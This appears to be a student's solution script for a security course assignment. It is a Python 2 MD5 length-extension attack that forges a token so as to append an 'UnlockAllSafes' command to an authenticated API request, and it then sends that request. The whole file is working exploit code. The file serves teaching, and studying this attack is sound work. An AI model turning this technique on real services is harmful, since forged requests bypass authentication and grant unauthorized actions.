from pymd5 import md5, padding
import httplib, urlparse, sys
import urllib


#url = "https://eecs388.org/project1/api?token=dfedf63833fcfe1221223a83185ca81c&user=admin&command1=ListFiles&command2=NoOp"
url = sys.argv[1]
# Your code to modify url goes here


token_ind = url.find("token=")
original_token = url[(token_ind+6):(token_ind)+38]

endofurl = url[(token_ind)+39:]
m = "88888888"+ endofurl
#print 64 - len(m)
bits = (len(m) + len(padding(len(m)*8)))*8

#print bits
md2 = md5(state = original_token.decode("hex"),count = bits)
x = "&command3=UnlockAllSafes" # command we want

#print x
md2.update(x)
padding = urllib.quote(padding(len(m)*8))

#print md2.hexdigest()

url2 = url[:(token_ind+6)]+md2.hexdigest()+"&"+endofurl + padding + x
#print url2

parsedUrl = urlparse.urlparse(url2)
conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
